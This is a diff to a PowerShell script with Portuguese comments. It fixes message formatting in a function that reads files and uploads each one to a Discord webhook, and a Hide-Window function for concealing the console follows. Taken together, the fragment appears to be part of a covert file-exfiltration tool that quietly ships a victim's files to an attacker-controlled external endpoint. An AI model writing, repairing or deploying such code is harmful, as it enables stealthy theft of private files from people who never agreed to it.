@@ -119,10 +119,14 @@ function Send-FilesToDiscord {
                 $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                 $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
                 
-                $bodyLines = (
+                # CORRIGIDO: Uso de string com aspas duplas e variáveis dentro
+                $fileSizeKB = [math]::Round($file.Length / 1KB, 1)
+                $contentText = "📎 $($file.Name) ($fileSizeKB KB)"
+                
+                $bodyLines = @(
                     "--$boundary",
                     "Content-Disposition: form-data; name=`"payload_json`"$LF",
-                    '{"content": "📎 ' + $file.Name + ' (' + [math]::Round($file.Length / 1KB, 1) + ' KB)"}',
+                    "{`"content`": `"$contentText`"}",
                     "--$boundary",
                     "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
                     "Content-Type: application/octet-stream$LF",
@@ -133,7 +137,7 @@ function Send-FilesToDiscord {
                 Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
                 Write-Host "Enviado (anexo): $($file.Name)" -ForegroundColor Green
                 $sentCount++
-                Start-Sleep -Milliseconds 500  # Pausa para não sobrecarregar a API
+                Start-Sleep -Milliseconds 500
             }
             catch {
                 Write-Host "Erro ao enviar $($file.Name): $_" -ForegroundColor Red
@@ -156,7 +160,6 @@ function Send-FilesToDiscord {
         total = $files.Count
     }
 }
-
 # ============= OCULTAÇÃO DA JANELA =============
 function Hide-Window {
     Write-Host "Ocultando a janela..." -ForegroundColor Yellow
